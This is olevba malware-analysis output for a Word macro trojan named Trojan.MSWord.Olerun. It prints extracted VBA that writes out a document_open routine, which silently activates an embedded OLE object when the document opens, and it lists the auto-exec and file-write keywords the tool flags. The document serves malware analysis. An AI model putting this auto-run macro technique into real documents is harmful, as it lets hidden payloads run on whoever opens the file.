olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Olerun
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.Olerun 
in file: Trojan.MSWord.Olerun - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Print #9, "Open ""c:\xploit.txt"" For Output As 2"
Print #9, "Print #2, ""sub document_open()"""
Print #9, "Print #2, ""On Error Resume Next"""
Print #9, "Print #2, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"""
Print #9, "Print #2, ""With ActiveDocument.Shapes(1).OLEFormat"""
Print #9, "Print #2, ""    .ActivateAs ClassType:=obj"""
Print #9, "Print #2, ""    .Activate"""
Print #9, "Print #2, ""End With"""
Print #9, "Print #2, ""end sub"""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
+----------+--------------------+---------------------------------------------+

